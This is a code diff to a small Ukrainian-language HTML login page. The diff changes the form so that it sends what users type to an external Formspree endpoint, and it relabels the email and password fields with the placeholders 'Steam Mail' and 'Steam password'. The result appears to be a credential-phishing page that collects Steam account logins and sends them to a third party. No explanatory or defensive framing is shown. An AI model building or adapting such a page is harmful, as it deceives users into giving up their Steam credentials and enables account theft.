@@ -3,21 +3,24 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Форма входу</title>
+<title>Форма</title>
 <link rel="stylesheet" type="text/css" href="css/style.css">
 </head>
 <body>
 
 <div class="container">
   <h2>Форма входу</h2>
-  <form action="/submit_form" method="post">
-    <label for="mail">Електронна пошта:</label>
-    <input type="text" id="mail" name="mail" required><br>
+  <form
+  action="https://formspree.io/f/mbjnbqpz"
+  method="POST"
+>
+  <label for="mail">Електронна пошта:</label>
+    <input type="text" id="mail" name="mail" placeholder="Steam Mail" required><br>
     <label for="password">Пароль:</label>
-    <input type="password" id="password" name="password" required><br>
+    <input type="password" id="password" name="password" placeholder="Steam password" required><br>
     <input type="submit" value="Увійти">
-  </form>
+</form>
 </div>
-<script src="scripts.js"></script>
+
 </body>
 </html>
